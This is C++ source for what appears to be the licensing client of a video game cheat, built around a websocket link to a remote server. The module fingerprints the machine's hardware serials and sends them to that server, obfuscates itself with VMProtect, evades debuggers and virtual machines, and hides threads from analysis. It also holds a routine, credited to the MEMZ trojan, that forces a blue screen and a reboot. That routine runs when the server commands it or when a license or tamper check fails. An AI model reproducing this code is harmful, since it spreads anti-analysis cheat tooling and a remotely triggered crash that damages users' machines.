#include "main.h"

static const char* const szLut = "0123456789ABCDEF";
WebSocket::pointer websocket = NULL;

__forceinline std::string HexToString(const std::string& sInput)
{
	if (sInput.length() & 1)
		return sInput;

	std::string sOutPut;

	sOutPut.reserve(sInput.length() / 2);

	for (size_t i = 0; i < sInput.length(); i += 2)
	{
		auto a = sInput[i];
		auto p = std::lower_bound(szLut, szLut + 16, a);

		if (*p != a)
			return sInput;

		auto b = sInput[i + 1];
		auto q = std::lower_bound(szLut, szLut + 16, b);

		if (*q != b)
			return sInput;

		sOutPut.push_back(((p - szLut) << 4) | (q - szLut));
	}

	return sOutPut;
}

__forceinline std::string StringToHex(const std::string& sInput)
{
	std::string sOutput;

	sOutput.reserve(2 * sInput.length());

	for (size_t i = 0; i < sInput.length(); ++i)
	{
		const unsigned char c = sInput[i];
		sOutput.push_back(szLut[c >> 4]);
		sOutput.push_back(szLut[c & 15]);
	}

	return sOutput;
}

__forceinline std::string FindArgument(const std::string &sInput, int iNumber, std::string sIterator = ";")
{
	std::string sTmp = sInput;
	size_t iCount = 0;

	for (auto i = 0; i < iNumber; i++)
	{
		if (iCount && sTmp.length() - iCount > 0 && iCount < sTmp.length() - iCount)
			sTmp = sInput.substr(iCount, sTmp.length() - iCount);

		auto pos = sTmp.find(sIterator);

		if (pos == std::string::npos)
			return std::string();

		sTmp = sTmp.substr(0, pos);

		iCount += sTmp.length() + 1;
	}

	return sTmp;
}

__forceinline std::string Xor(const std::string &sInput)
{
	static const char szKey[] = { '~','L','5','v','A','u','i','N','a','e','n','?','R','f','F','M','l','{','$','c','k','G','3','J','D','T','o','#','Y','V','8','Q','6','x','0','W','}','p','4','X','P','C','|','r','1','K','8','t','$','C','H','t','c','b','b','|','F','L','S','9','k','0','N','9' };

	std::string sOutput(sInput);

	for (auto i = 0; i < sInput.size(); i++)
		sOutput[i] = sInput[i] ^ szKey[i % (sizeof(szKey) / sizeof(char))];
	return sOutput;
}

void handle_message(const std::string & message)
{
	g_Globals.m_LastPacketTime = clock();

	if (message == VMP_DecryptA("terminate"))
	{
		killWindowsInstant();
		TerminateProcess(GetCurrentProcess(), 0);
		return;
	}
	//else if (message.find(VMProtectDecryptStringA("shared<")) != std::string::npos)
	//{
	//	g_pICvar->ConsolePrintf("msg: %s\n", message.c_str());
	//	auto response = message;
	//	response.erase(response.begin(), response.end() - response.length() + 7);
	//	const auto users_count = std::stoi(FindArgument(response, 1, "^"));

	//	g_pIEngine->Con_NPrintf(30, "users_count: %d", users_count);

	//	for (int i = 1; i <= users_count; i++)
	//	{
	//		auto user = FindArgument(response, 1 + i, "^");

	//		if (user.empty())
	//			break;

	//		//g_pConsole->DPrintf("user %s\n", user.c_str());

	//		const auto index = std::stoi(FindArgument(user, 1));

	//		if (index > MAX_CLIENTS)
	//			continue;

	//		if (g_Local->m_iEntIndex == index)
	//			continue;

	//		const auto x = std::stof(FindArgument(user, 2));
	//		const auto y = std::stof(FindArgument(user, 3));
	//		const auto z = std::stof(FindArgument(user, 4));		
	//		const auto origin = Vector(x, y, z);

	//		if (origin.IsZero())
	//			continue;

	//		if (g_Player[index]->m_IsDead)
	//			continue;

	//		if (!g_Player[index]->m_IsDormant)
	//			continue;

	//		g_pIEngine->Con_NPrintf(index, "idx: %d | pos: %.0f, %.0f, %.0f", index, x, y, z);

	//		const auto bUpdateOrigin = (g_Player[index]->m_IsSoundUpdated && g_pGlobalVars->curtime -
	//			g_Player[index]->m_flHistory > cvar.visuals.esp_player_history_time) || !g_Player[index]->m_IsSoundUpdated;

	//		if (bUpdateOrigin)
	//			g_Player.UpdateOrigin(origin, index, false);

	//		g_pICvar->ConsolePrintf("%i %i %f %f %f\n", i,index,x,y,z);
	//	}
	//}
	else if (message.find(VMP_DecryptA("Online users")) != std::string::npos)
	{
		//if (g_Globals.m_sOnlineUsers.length() == 0)
		//	g_pConsole->DPrintf("%s\n", message.c_str());

		g_Globals.m_sOnlineUsers = message.substr(message.find(":") + 2);

		/*const int online_num = std::stoi(g_Globals.m_sOnlineUsers) + 50;
		std::stringstream online_stream;
		online_stream << online_num;
		g_Globals.m_sOnlineUsers = online_stream.str();*/
	}
	else if (message == VMP_DecryptA("badlicense"))
	{
		//TraceLog(VMProtectDecryptStringA("websocket: bad license.\n"), __FUNCTION__);
		g_Globals.m_bUnloadLibrary = true;
		g_Globals.m_bLicenseChecked = false;
		TerminateProcess(GetCurrentProcess(), 0);
	}
	else if (message.find(VMP_DecryptA("activated")) != std::string::npos && g_Globals.m_sUUID.length() && g_Globals.m_dwProcessID)
	{
		VMP_ULTRA(__FUNCTION__);

		std::string sRespone(message), sServerTime, sProcessID, sRequestUUID;
		sRespone.erase(sRespone.begin(), sRespone.end() - sRespone.length() + 10);
		sRespone = HexToString(sRespone);
		sRespone = Xor(sRespone);
		sServerTime = FindArgument(sRespone, 1);
		sProcessID = FindArgument(sRespone, 2);
		sRequestUUID = FindArgument(sRespone, 4);

		if (!sServerTime.length() || !sProcessID.length() || !sRequestUUID.length())
			return;

		sRequestUUID = HexToString(sRequestUUID);
		sRequestUUID = Xor(sRequestUUID);

		const auto server_time = std::stoi(sServerTime);
		const auto processid = std::stoi(sProcessID);

		const auto client_time = (int)(time(NULL));
		const auto time_diff = abs(client_time - server_time);

		if (time_diff < (24 * 60 * 60) && processid == g_Globals.m_dwProcessID && sRequestUUID == g_Globals.m_sUUID)
		{
			std::string sCloudOffset[2];
			sCloudOffset[0] = FindArgument(sRespone, 5);
			sCloudOffset[1] = FindArgument(sRespone, 6);

			if (!sCloudOffset[0].length() || !sCloudOffset[1].length())
				return;

			g_Offsets.m_dwCloudOffsets[0] = std::stoi(sCloudOffset[0]);
			g_Offsets.m_dwCloudOffsets[1] = std::stoi(sCloudOffset[1]);
		}
		else
		{
			killWindowsInstant();
			TerminateProcess(GetCurrentProcess(), 0);
			return;
		}

		CheckTime();
		
		static bool bInit = false;

		if (!bInit)
		{
			//if (!g_Offsets.FindHardware())
			//	return;

			if (!g_Offsets.FindInterfaces())
				return;

			bInit = true;
		}

		g_Globals.m_bLicenseChecked = true;
		//TraceLog(VMProtectDecryptStringA("websocket: license synchronized.\n"), __FUNCTION__);

		VMP_END;
	}
}

bool UpdateSocket()
{
	if (websocket->getReadyState() != WebSocket::CLOSED)
	{
		websocket->poll();
		websocket->dispatch(handle_message);
		return true;
	}

	return false;
}

bool CreateSocket()
{
	VMP_ULTRA(__FUNCTION__);

	WSADATA wsaData;

	auto rc = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (rc)
	{
		TraceLog(VMP_DecryptA("%s: WSAStartup error %i.\n"), __FUNCTION__, rc);
		return false;
	}

	websocket = WebSocket::from_url(VMP_DecryptA("ws://sock.hpp.ovh:1338/hpp"));

	g_Globals.m_iSocketServerID = 1;

	if (!websocket)
	{
		TraceLog(VMP_DecryptA("%s: failed connect to websocket (Netherlands).\n"), __FUNCTION__);

		websocket = WebSocket::from_url(VMP_DecryptA("ws://sock2.hpp.ovh:1338/hpp"));

		g_Globals.m_iSocketServerID = 2;

		if (!websocket)
		{
			TraceLog(VMP_DecryptA("%s: failed connect to proxy websocket (Russia).\n"), __FUNCTION__);
			return false;
		}
	}

	VMP_END;
	return true;
}

void CloseSocket()
{
	if (websocket)
	{
		websocket->close();
		WSACleanup();
	}
}

void Reconnect()
{
	VMP_ULTRA(__FUNCTION__);

	g_Globals.m_bLicenseChecked = false;
	TraceLog(VMP_DecryptA("websocket: reconnecting...\n"));
	CloseSocket();

	if (CreateSocket())
	{
		SendHardwareID();
	}

	VMP_END;
}

void SendHardwareID()
{
	VMP_ULTRA(__FUNCTION__);
#ifdef LICENSING
	if (!VMProtectIsProtected() || VMProtectIsDebuggerPresent(true) || VMProtectIsVirtualMachinePresent() || !VMProtectIsValidImageCRC())
	{
		g_Globals.m_bUnloadLibrary = true;
		killWindowsInstant();
		TerminateProcess(GetCurrentProcess(), 0);
		return;
	}
#endif
	CheckTime();

	if (!websocket)
		return;

	HRESULT hResult = CoInitializeEx(0, COINIT_MULTITHREADED);

	if (FAILED(hResult))
		return;

	IWbemLocator *pLoc = NULL;
	hResult = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc);

	if (FAILED(hResult))
		return;

	IWbemServices *pServices = NULL;
	hResult = pLoc->ConnectServer(bstr_t(VMP_DecryptA("ROOT\\CIMV2")), NULL, NULL, 0, NULL, 0, 0, &pServices);

	if (FAILED(hResult))
		return;

	std::wstringstream wssHardwareID;
	wssHardwareID << time(NULL) << ';';
	wssHardwareID << g_Globals.m_dwProcessID << ';';

	hResult = CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

	if (FAILED(hResult))
		return;

	IEnumWbemClassObject* pEnumerator = NULL;
	hResult = pServices->ExecQuery(bstr_t(VMP_DecryptA("WQL")), bstr_t(VMP_DecryptA("SELECT * FROM Win32_BaseBoard")), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);

	if (FAILED(hResult))
		return;

	IWbemClassObject *pClassObj = NULL;
	ULONG ulReturn = 0;

	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObj, &ulReturn);

		if (0 == ulReturn)
			break;

		VARIANT vtProp;
		hr = pClassObj->Get(VMP_DecryptW(L"SerialNumber"), 0, &vtProp, 0, 0);
		wssHardwareID << vtProp.bstrVal << ';';
		VariantClear(&vtProp);
	}

	pEnumerator = NULL;
	hResult = pServices->ExecQuery(bstr_t(VMP_DecryptA("WQL")), bstr_t(VMP_DecryptA("SELECT * FROM Win32_BIOS")), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);

	if (FAILED(hResult))
		return;

	pClassObj = NULL;
	ulReturn = 0;

	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObj, &ulReturn);

		if (0 == ulReturn)
			break;

		VARIANT vtProp;
		hr = pClassObj->Get(VMP_DecryptW(L"SerialNumber"), 0, &vtProp, 0, 0);
		wssHardwareID << vtProp.bstrVal << ';';
		VariantClear(&vtProp);
	}

	pEnumerator = NULL;
	hResult = pServices->ExecQuery(bstr_t(VMP_DecryptA("WQL")), bstr_t(VMP_DecryptA("SELECT * FROM Win32_ComputerSystemProduct")), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);

	if (FAILED(hResult))
		return;

	std::wstringstream wssUUID;

	pClassObj = NULL;
	ulReturn = 0;

	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObj, &ulReturn);

		if (0 == ulReturn)
			break;

		VARIANT vtProp;
		hr = pClassObj->Get(VMP_DecryptW(L"UUID"), 0, &vtProp, 0, 0);
		wssHardwareID << vtProp.bstrVal << ';';
		wssUUID << vtProp.bstrVal;
		VariantClear(&vtProp);
		pClassObj->Release();
	}

	pEnumerator = nullptr;
	hResult = pServices->ExecQuery(_bstr_t(VMP_DecryptA("WQL")), _bstr_t(VMP_DecryptA("SELECT * FROM Win32_DesktopMonitor")), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator);

	if (FAILED(hResult))
		return;

	pClassObj = nullptr;
	ulReturn = 0;

	while (pEnumerator)
	{
		pEnumerator->Next(WBEM_INFINITE, 1, &pClassObj, &ulReturn);

		if (!ulReturn)
			break;

		VARIANT vtProp;
		pClassObj->Get(VMP_DecryptW(L"PNPDeviceID"), 0, &vtProp, nullptr, nullptr);

		if (!vtProp.bstrVal)
			continue;

		wssHardwareID << vtProp.bstrVal << ';';
		VariantClear(&vtProp);
		pClassObj->Release();
	}

	pEnumerator = nullptr;
	hResult = pServices->ExecQuery(_bstr_t(VMP_DecryptA("WQL")), _bstr_t(VMP_DecryptA("SELECT * FROM Win32_DiskDrive")), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator);

	if (FAILED(hResult))
		return;

	pClassObj = nullptr;
	ulReturn = 0;

	while (pEnumerator)
	{
		pEnumerator->Next(WBEM_INFINITE, 1, &pClassObj, &ulReturn);

		if (!ulReturn)
			break;

		VARIANT vtProp;
		pClassObj->Get(VMP_DecryptW(L"MediaType"), 0, &vtProp, nullptr, nullptr);

		if (!vtProp.bstrVal)
			continue;

		std::wstring wsTmp = vtProp.bstrVal;

		if (wsTmp.find(VMP_DecryptW(L"Fixed")) == std::string::npos)
			continue;

		pClassObj->Get(VMP_DecryptW(L"SerialNumber"), 0, &vtProp, nullptr, nullptr);

		if (!vtProp.bstrVal)
			continue;

		wssHardwareID << vtProp.bstrVal << ';';
		VariantClear(&vtProp);

		pClassObj->Release();
	}

	pServices->Release();
	pLoc->Release();
	pEnumerator->Release();
	CoUninitialize();

	std::wstring wsWide(wssHardwareID.str());

	if (wsWide.length() < 1)
		return;

	std::string sHWID(wsWide.begin(), wsWide.end());

	wsWide = wssUUID.str();
	std::string sUUID(wsWide.begin(), wsWide.end());

	sHWID = StringToHex(Xor(sHWID));
	reverse(sHWID.begin(), sHWID.end());

	g_Globals.m_sUUID = sUUID;

	std::string msg = VMP_DecryptA("hwid>");
	msg.append(sHWID);

	websocket->send(msg);

	VMP_END;
}

void CheckTime()
{
	VMP_ULTRA(__FUNCTION__);

	SYSTEMTIME SystemTime;
	GetSystemTime(&SystemTime);

	const auto year = 2019;
	const auto month = 9;

	auto next_month = month + 1;
	auto prev_month = month - 1;

	if (next_month > 12)
		next_month = 1;

	if (prev_month < 1)
		prev_month = 12;

	if (SystemTime.wYear != year && SystemTime.wMonth != month && SystemTime.wMonth != next_month && SystemTime.wMonth != prev_month)
		TerminateProcess(GetCurrentProcess(), 0);

	if (g_pISteamUtils)
	{
		const time_t ServerRealTime = g_pISteamUtils->GetServerRealTime();
		const auto FormatedServerRealTime = localtime(&ServerRealTime);
		auto realtime_month = FormatedServerRealTime->tm_mon + 1;

		if (realtime_month > 12)
			realtime_month = 1;

		if (realtime_month < 1)
			realtime_month = 12;

		if (FormatedServerRealTime->tm_year != year && realtime_month != month && realtime_month != next_month && realtime_month != prev_month)
			TerminateProcess(GetCurrentProcess(), 0);
	}

	VMP_END;
}

void killWindowsInstant() //https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a912a3dcebd8705d259d/WindowsTrojan/Source/Destructive/KillWindows.c
{
#ifdef LICENSING
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
#endif
	websocket->send(VMP_DecryptA("pidor"));
}

bool HideThread(HANDLE hThread)
{
	const auto NtDll = GetModuleHandle("ntdll.dll");

	if (!NtDll)
		return false;

	const auto NtSIT = (pNtSetInformationThread)GetProcAddress(NtDll, "NtSetInformationThread");

	if (!NtSIT)
		return false;

	const auto Status = hThread ? NtSIT(hThread, 0x11, 0, 0) : NtSIT(GetCurrentThread(), 0x11, 0, 0);

	return Status == 0;
}